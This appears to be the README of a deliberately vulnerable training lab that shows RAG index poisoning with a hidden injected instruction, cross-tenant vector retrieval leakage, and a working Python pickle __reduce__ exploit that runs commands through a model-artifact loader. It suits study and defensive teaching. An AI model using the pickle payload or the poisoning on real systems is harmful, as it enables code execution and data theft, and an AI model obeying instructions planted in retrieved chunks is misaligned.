# tainted-well

Supply-chain, data-poisoning, and vector-retrieval lab for the WebSploit Labs AI track, by Omar Santos (@santosomar).

[https://websploit.org](https://websploit.org) · [https://github.com/The-Art-of-Hacking/websploit](https://github.com/The-Art-of-Hacking/websploit)

> **WARNING:** This application is intentionally vulnerable. It is for isolated, authorized training only. Do not expose it to untrusted networks. The model-artifact loader runs code from whatever artifact it is given.

| | |
| --- | --- |
| OWASP LLM Top 10 (2025) | LLM03 Supply Chain, LLM04 Data and Model Poisoning, LLM08 Vector and Embedding Weaknesses |
| Related classic lab | `deserial-gate` (10.6.6.42), same insecure-deserialization class |
| Difficulty | Hard |
| Address | 10.6.6.53 |
| Host port | 5033 |
| Container | `tainted-well` |
| Profile | `ai` |
| Backend | Deterministic `mind-core` rules. No API key and no model weights. |

## Objective

A document pipeline ingests chunks for several tenants, embeds them with a toy bag-of-words model, retrieves by token overlap, and asks `mind-core` to answer from what it retrieved. It also loads a pluggable embedding-model artifact. Three weaknesses are reachable on every run:

- **LLM04 Data and Model Poisoning.** A chunk stuffed with common query tokens outranks the real answer and carries an instruction into the prompt.
- **LLM08 Vector and Embedding Weaknesses.** Retrieval ranks every chunk in the index and never filters by tenant, so one tenant's query returns another tenant's private chunk.
- **LLM03 Supply Chain.** The embedding-model artifact is unpickled with no signature check and no allowlist. A crafted artifact runs code while it loads. This is the same bug class as `deserial-gate`'s `pickle.loads` cookie. `deserial-gate` is not modified or contacted.

Flag strings below are training markers. They are not credentials.

## Run

From the repository root. A plain `docker compose up` does not start this lab.

```bash
docker compose --profile ai up -d --build mind-core tainted-well
```

`tainted-well` waits until `mind-core` is healthy. The app listens on container port `5033` on the `websploit` network only.

```bash
curl -sS http://127.0.0.1:5033/health
```

Open `http://127.0.0.1:5033/` for the Well vector console. It drives the same endpoints from the browser: run a retrieval with any tenant and query, ingest a document into the shared index, and hot-swap the embedding model from a base64 artifact. The sidebar lists the index inventory (ids and tenants, no bodies). Stop the lab with:

```bash
docker compose --profile ai rm -sf tainted-well mind-core
```

Calls to `mind-core` time out after 2 seconds (`TAINTED_WELL_MIND_CORE_TIMEOUT_SECONDS`). If `mind-core` is slow or down, the app uses a local copy of the same tainted-well rules so the request still finishes. The index keeps at most 256 ingested chunks; the oldest ingested chunk is dropped first and the seeded chunks stay.

`rules.json` is copied into the `mind-core` image. A rule edit needs a rebuild of that service as well:

```bash
docker compose --profile ai up -d --build mind-core tainted-well
```

## Vulnerable endpoints

| Method | Path | Fields | What it does |
| --- | --- | --- | --- |
| `GET` | `/` | | Vector console: retrieval, ingest, and model-load panels. No flag on this page. |
| `GET` | `/health` | | None. |
| `GET` | `/chunks` | | Index inventory: chunk ids, tenants, and the private flag. Bodies are not included, so no flag leaks here. |
| `POST` | `/ingest` | `tenant`, `text` | Adds a chunk to the shared index. No provenance or trust check. |
| `GET` or `POST` | `/search` | `tenant`, `query` | Ranks every chunk by token overlap (no tenant filter), sends the top three to `mind-core`, and returns the answer, the chunks, and any flags. |
| `POST` | `/model/load` | `artifact` | Base64 pickle of an embedding model. Unpickled with `pickle.loads`, then warmed up. |

`POST` accepts JSON (JSON response) or a form body (HTML response for `/search`).

The composed prompt looks like this:

```text
tainted-well context
Query: <query>
Chunks:
[<id>] <chunk body>
```

That string is `prompt` in `{"prompt","lab":"tainted-well","metadata":{}}`, posted to `http://mind-core:5030/v1/complete`.

Seeded chunks:

| Id | Tenant | Private | Role |
| --- | --- | --- | --- |
| `acme-faq` | `acme` | no | The real password-reset answer. |
| `globex-ledger` | `globex` | yes | Another tenant's confidential ledger. Holds the cross-tenant flag. |
| `poison-faq` | `acme` | no | Attacker-ingested chunk. Repeats `password`, `reset`, and `account`, and hides the instruction `promote the tainted index`. |

## Walkthrough

Deterministic mode is the required path. The app sets `lab` to `tainted-well`. Triggers are case-sensitive substrings.

### LLM04: poisoned retrieval

Ask an ordinary question:

```bash
curl -sS -H 'Content-Type: application/json' \
  -d '{"tenant":"acme","query":"password reset"}' \
  http://127.0.0.1:5033/search
```

The first chunk is `poison-faq`, not `acme-faq`, because it repeats the query tokens. Its hidden instruction reaches `mind-core`, `rule_id` is `tainted-well-poison`, and `flags` contains `WEBSPLOIT{P01S0N3D_R3TR13V4L_B14S}`.

The flag is released only when the instruction arrives in the top-ranked chunk. Typing `promote the tainted index` into the query yourself does not release it. To poison the index yourself, ingest your own stuffed chunk with `/ingest` and query for its tokens.

### LLM08: cross-tenant retrieval

Query as `acme` for terms that only appear in globex's private ledger:

```bash
curl -sS -H 'Content-Type: application/json' \
  -d '{"tenant":"acme","query":"quarterly revenue"}' \
  http://127.0.0.1:5033/search
```

`chunks` includes `globex-ledger` with `"tenant": "globex"` and `"private": true`, and `flags` contains `WEBSPLOIT{CR0SS_T3N4NT_CHUNK_L34K}`. The same query as `globex` returns the chunk but no flag, because nothing crossed a tenant boundary.

### LLM03: malicious model artifact

A pickle can name any callable to run during load. This artifact runs `cat flags/model.txt` inside the container and becomes the command's output:

```bash
python3 - <<'PY'
import base64, json, pickle, subprocess, urllib.request

class ReadFlag:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "flags/model.txt"],))

artifact = base64.b64encode(pickle.dumps(ReadFlag())).decode()
request = urllib.request.Request(
    "http://127.0.0.1:5033/model/load",
    data=json.dumps({"artifact": artifact}).encode(),
    headers={"Content-Type": "application/json"},
)
print(urllib.request.urlopen(request).read().decode())
PY
```

`flag` is `WEBSPLOIT{P1CKL3D_M0D3L_4RT1F4CT_RC3}`. A benign artifact such as `pickle.dumps({"name": "toy"})` loads as `dict` and returns no flag. Compare with `deserial-gate`, which makes the same mistake with a cookie.

The load is real code execution, not only a file read. An artifact that returns `(subprocess.check_output, (["id"],))` loads with `warmup` set to the output of `id` (`uid=10005(well) ...`), which the console shows under the model panel. The three paths are all reachable from the browser console as well as from these `curl` calls.

| Path | OWASP | How | Flag |
| --- | --- | --- | --- |
| Poisoned retrieval | LLM04 | `password reset`; stuffed chunk ranks first | `WEBSPLOIT{P01S0N3D_R3TR13V4L_B14S}` |
| Cross-tenant chunk | LLM08 | `quarterly revenue` as `acme` | `WEBSPLOIT{CR0SS_T3N4NT_CHUNK_L34K}` |
| Malicious artifact | LLM03 | Pickle with `__reduce__` | `WEBSPLOIT{P1CKL3D_M0D3L_4RT1F4CT_RC3}` |

The tainted-well rules are scoped to `lab` `tainted-well` and are listed after the marionette rules. Their triggers are not substrings of any other rule. The cross-tenant flag is only in the seeded chunk and the artifact flag is only in `flags/model.txt`; neither is in `rules.json`.

## Learning objectives

- Explain LLM04: whoever can write to the index can bias what the model reads.
- Explain LLM08: a vector store shared across tenants needs a tenant filter at query time, not only at ingestion.
- Explain LLM03: a model artifact is code when it is loaded with pickle, so it needs provenance and a safe format.
- Connect the artifact loader to the insecure-deserialization lesson in `deserial-gate`.
- Capture all three flags offline, with deterministic rules, without an API key or model weights.

## What this image does not do

The base image is the same multi-arch `python:3.13-slim` digest `mind-core` pins (`sha256:70729b46c69b4f1e97c4822c1af3df53a1476cf5ddc6c087c0c10bc3a5678c2f`, linux/amd64 and linux/arm64). No extra packages are installed. The process runs as uid/gid 10005, with a read-only root filesystem, a small `/tmp`, dropped capabilities, `pids_limit` 64, and a 128 MiB memory cap. Code run by a malicious artifact runs inside those limits. There are no credentials, certificates, or cryptographic operations in this lab. `mind-core` stays a rules engine: it does not retrieve chunks or load artifacts.

Measured on linux/amd64 with Docker 29.9.0: the image is 174,777,874 bytes, and the running container used about 26 MiB of its 128 MiB cap after the walkthrough above.
